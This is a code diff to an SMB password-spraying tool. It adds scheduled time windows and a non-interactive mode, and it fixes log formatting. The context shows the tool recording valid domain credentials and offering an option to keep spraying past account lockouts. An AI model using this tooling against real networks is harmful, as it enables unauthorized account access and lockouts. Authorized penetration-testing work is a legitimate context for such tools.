@@ -69,6 +69,13 @@ class Locked(Exception):
     def __init__(self, locked_user):
         self.locked_user = locked_user
 
+# Check if current time is within the allowed time range
+def is_within_time_range(current_time, start_time, end_time):
+    if start_time < end_time:
+        return start_time <= current_time < end_time
+    else:  # Over midnight scenario
+        return current_time >= start_time or current_time < end_time
+
 # login to smb function
 def login(username, password, domain, host, verbose=False):
     # safe way to kill login functionality once exceptions are made
@@ -93,10 +100,10 @@ def login(username, password, domain, host, verbose=False):
                 else:
                     ip = host
                 if is_admin:
-                    message = get_pretty_time("success") + "{}:{}\t{}{}\{}:{} ".format(ip,hostname,colored("[+] ","green", attrs=['bold']),domain,username,password) + colored("(ADMIN!)","green", attrs=['bold'])
+                    message = get_pretty_time("success") + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[+] ","green", attrs=['bold']),domain,username,password) + colored("(ADMIN!)","green", attrs=['bold'])
 
                 else:
-                    message = get_pretty_time("success") + "{}:{}\t{}{}\{}:{} ".format(ip,hostname,colored("[+] ","green", attrs=['bold']),domain,username,password)
+                    message = get_pretty_time("success") + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[+] ","green", attrs=['bold']),domain,username,password)
                 
                 with open(valid_creds, "a+") as f:
                     f.write(domain + "\\" + username + ":" + password + "\r\n")
@@ -114,13 +121,13 @@ def login(username, password, domain, host, verbose=False):
                 domain = smbclient.getServerDNSDomainName()
             
             if error in smb_error_status:
-                message = get_pretty_time("warn") + "{}:{}\t{}{}\{}:{} ".format(ip,hostname,colored("[-] ","yellow", attrs=['bold']),domain,username,password) + colored(error,"yellow", attrs=['bold'])
+                message = get_pretty_time("warn") + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[-] ","yellow", attrs=['bold']),domain,username,password) + colored(error,"yellow", attrs=['bold'])
             elif error == smb_error_locked:
-                message = get_pretty_time("danger") + "{}:{}\t{}{}\{}:{} ".format(ip,hostname,colored("[!] ","red", attrs=['bold']),domain,username,password) +  colored(error,"red", attrs=['bold'])
+                message = get_pretty_time("danger") + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[!] ","red", attrs=['bold']),domain,username,password) +  colored(error,"red", attrs=['bold'])
                 print(message)
                 raise Locked(username)
             else:
-                message = get_pretty_time() + "{}:{}\t{}{}\{}:{} ".format(ip,hostname,colored("[-] ","red", attrs=['bold']),domain,username,password) + error
+                message = get_pretty_time() + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[-] ","red", attrs=['bold']),domain,username,password) + error
             smbclient.close()
         print(message)
         if verbose and desc:
@@ -263,10 +270,13 @@ def main():
     parser.add_argument('--verbose', help="Verbose Mode", action='store_true')
     parser.add_argument('--user_pw', help="Try username variations as password", action='store_true')
     parser.add_argument('--unsafe', help="Keep spraying even if there are multiple account lockouts", action='store_true')
+    parser.add_argument('--no-interaction', help="Run without interactive input", action='store_true')
+    parser.add_argument('--start-time', metavar="HH:MM", help="Start time for allowed operation", type=str)
+    parser.add_argument('--end-time', metavar="HH:MM", help="End time for allowed operation", type=str)
     
     args = parser.parse_args()
     if len(sys.argv) == 1:
-            parser.print_help()
+        parser.print_help()
 
     global domain
     global host
@@ -275,7 +285,7 @@ def main():
     global total_passwords
     global lockout_period
     global i
-    global unsafe 
+    global unsafe
     global locked_users
     global threads
     domain = args.d 
@@ -289,13 +299,22 @@ def main():
     locked_users = set()
     threads = args.threads
 
+    if args.start_time and args.end_time:
+        start_time = datetime.datetime.strptime(args.start_time, "%H:%M").time()
+        end_time = datetime.datetime.strptime(args.end_time, "%H:%M").time()
+        current_time = datetime.datetime.now().time()
+        while not is_within_time_range(current_time, start_time, end_time):
+            print(colored("[*] Outside allowed time range. Waiting... Current time: {}".format(current_time), "yellow", attrs=['bold']))
+            sleep(60)  # Check every minute
+            current_time = datetime.datetime.now().time()
+
     i = 0
 
     if not args.u and not args.U:
-        print(colored("[!] No users to spray... exiting", "red",attrs=['bold']))
+        print(colored("[!] No users to spray... exiting", "red", attrs=['bold']))
         sys.exit()
     
-    if not args.p and not args.P:
+    if not args.p and not args.P and not args.user_pw:
         print(colored("[!] No passwords to spray... exiting", "red",attrs=['bold']))
         sys.exit()
     
@@ -329,9 +348,8 @@ def main():
             for tried_password in tried_passwords:
                 if tried_password in password_list:
                     password_list.remove(tried_password)
-                    print(colored("[*] {} already attempted, removed from spray list".format(tried_password), "yellow",attrs=['bold']))
+                    print(colored("[*] {} already attempted, removed from spray list".format(tried_password), "yellow", attrs=['bold']))
 
-    
     total_passwords = len(password_list)
 
     # add three total passwords to try for username variations
@@ -339,7 +357,7 @@ def main():
         total_passwords += 3
     
     if total_passwords == 0:
-        print(colored("[!] No passwords to spray... exiting", "red",attrs=['bold']))
+        print(colored("[!] No passwords to spray... exiting", "red", attrs=['bold']))
         sys.exit()
 
     # ugly math for rough estimate of time to completion
@@ -350,19 +368,21 @@ def main():
         mathz = lockout_period * mathz1 - lockout_period
 
     print(colored("[*] Attempting {} passwords every {} minutes for {} total passwords".format(attempts, lockout_period, total_passwords),"yellow",attrs=['bold']))
-    if total_passwords <= attempts:
-        print(colored("[*] This will run to completion without sleeping", "yellow",attrs=['bold']))
-        input(colored("[*] Press Enter to proceed","yellow",attrs=['bold']))
-    else: 
-        print(colored("[*] This will take just over {} minutes to complete".format(mathz),"yellow",attrs=['bold']))
-        input(colored("[*] Press Enter to proceed","yellow",attrs=['bold']))
     
+    if not args.no_interaction:
+        if total_passwords <= attempts:
+            print(colored("[*] This will run to completion without sleeping", "yellow", attrs=['bold']))
+            input(colored("[*] Press Enter to proceed", "yellow", attrs=['bold']))
+        else: 
+            print(colored("[*] This will take just over {} minutes to complete".format(mathz), "yellow", attrs=['bold']))
+            input(colored("[*] Press Enter to proceed", "yellow", attrs=['bold']))
+
     # do username variations as passwords
     if args.user_pw:
-        print(get_pretty_time("warn") + colored("Trying username password variations","yellow",attrs=['bold']))
-        try_password(user_list,"", threads, option="lower", unsafe=unsafe)
-        try_password(user_list,"", threads, option="upper", unsafe=unsafe)
-        try_password(user_list,"", threads, option="capital", unsafe=unsafe)
+        print(get_pretty_time("warn") + colored("Trying username password variations", "yellow", attrs=['bold']))
+        try_password(user_list, "", threads, option="lower", unsafe=unsafe)
+        try_password(user_list, "", threads, option="upper", unsafe=unsafe)
+        try_password(user_list, "", threads, option="capital", unsafe=unsafe)
 
     # iterate through passwords list
     if password_list:
